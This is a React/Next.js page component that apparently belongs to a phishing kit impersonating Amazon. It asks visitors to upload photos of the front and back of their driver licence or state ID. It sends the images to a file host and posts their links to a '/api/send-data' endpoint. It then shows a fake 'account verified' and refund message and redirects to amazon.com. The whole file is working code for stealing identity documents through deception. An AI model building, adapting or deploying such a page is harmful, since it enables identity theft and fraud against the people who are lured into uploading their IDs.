"use client";

import React, { useState } from "react";
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import Image from "next/image";
import axios from "axios";
import { useRouter } from "next/navigation";

const UploadID = () => {
  const [loading, setLoading] = useState(false);
  const [frontFile, setFrontFile] = useState(null);
  const [backFile, setBackFile] = useState(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const router = useRouter();

  const uploadToUploadcare = async (file) => {
    const formData = new FormData();
    formData.append(
      "UPLOADCARE_PUB_KEY",
      process.env.NEXT_PUBLIC_UPLOADCARE_KEY,
    );
    formData.append("file", file);

    const res = await fetch("https://upload.uploadcare.com/base/", {
      method: "POST",
      body: formData,
    });
    const data = await res.json();
    return `https://ucarecdn.com/${data.file}/`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!frontFile || !backFile) {
      alert("Please select both ID images.");
      return;
    }

    try {
      setLoading(true);

      const frontUrl = await uploadToUploadcare(frontFile);
      const backUrl = await uploadToUploadcare(backFile);

      await axios.post("/api/send-data", {
        frontId: frontUrl,
        backId: backUrl,
      });

      setShowSuccessModal(true);

      setTimeout(() => {
        router.push("https://amazon.com");
      }, 5000);
    } catch (err) {
      alert("Upload failed, please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleCloseModal = () => {
    setShowSuccessModal(false);
    router.push("https://amazon.com");
  };

  return (
    <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
            Upload your ID photo
          </h1>

          <div className="flex-center mb-3">
            <img
              src={"/images/id-front-back.jpg"}
              alt="ID card front and back"
              width={300}
              height={250}
              className="object-contain"
            />
          </div>

          <p className="text-sm text-gray-700 mb-6">
            {`Photo of your ID document (Both sides for driver license or state ID). The photo must be clear (JPG or PNG).`}
          </p>

          <form onSubmit={handleSubmit}>
            <div>
              <label htmlFor="frontId">Front photo of ID:</label>
              <input
                type="file"
                id="frontId"
                accept="image/*"
                className="bg-slate-200 p-1 rounded-md w-full px-3 cursor-pointer mt-1 text-sm mb-4"
                required
                onChange={(e) => setFrontFile(e.target.files[0])}
              />
            </div>

            <div>
              <label htmlFor="backId">Back photo of ID:</label>
              <input
                type="file"
                id="backId"
                accept="image/*"
                className="bg-slate-200 p-1 rounded-md w-full px-3 cursor-pointer mt-1 text-sm"
                required
                onChange={(e) => setBackFile(e.target.files[0])}
              />
            </div>

            <button
              className="cursor-pointer w-full py-3 mt-6 bg-[#ffd814]   rounded-lg font-bold text-black transition-colors disabled:opacity-60 disabled:cursor-not-allowed"
              type="submit"
              disabled={loading}
            >
              {loading ? "Submitting..." : "Submit"}
            </button>
          </form>
        </div>
      </div>

      {showSuccessModal ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0f172a]/70 px-4 py-6">
          <div
            role="dialog"
            aria-modal="true"
            className="w-full max-w-[450px] overflow-hidden rounded-[18px] border border-[#d5d8dd] bg-[#ececef] shadow-[0_28px_70px_rgba(8,17,36,0.45)]"
          >
            <div className="px-6 pt-8 pb-8 text-center">
              <h2 className="text-3xl font-semibold leading-none text-black">
                Congratulation!
              </h2>

              <div className="mt-7 grid grid-cols-4 gap-3 md:gap-5">
                {Array.from({ length: 4 }).map((_, index) => (
                  <span
                    key={index}
                    className="h-[5px] w-full rounded-full bg-primary"
                  />
                ))}
              </div>

              <div className="mt-8 flex justify-center">
                <svg
                  viewBox="0 0 140 140"
                  className="h-[100px] w-[100px]"
                  fill="none"
                  aria-hidden="true"
                >
                  <circle
                    cx="70"
                    cy="70"
                    r="49"
                    stroke="#37acd9"
                    strokeWidth="2.2"
                  />
                  <path
                    d="M45 72L67 96L102 47"
                    stroke="#37acd9"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </div>

              <p className="mx-auto mt-1 text-lg leading-tight text-[#6f747a] md:mt-4 ">
                Your account has been successfully verified.
              </p>
              <p className="mx-auto mt-5 text-lg leading-tight text-[#6f747a] ">
                Our team will process your refund within 24 hours.
              </p>
            </div>

            <div className="flex justify-center border-t border-[#dbdde1] bg-[#f1f2f4] py-4 md:py-6">
              <button
                type="button"
                onClick={handleCloseModal}
                className="rounded-full bg-primary px-11 py-2 text-lg font-semibold text-black  shadow-inner transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      ) : null}

      <Footer />
    </main>
  );
};

export default UploadID;
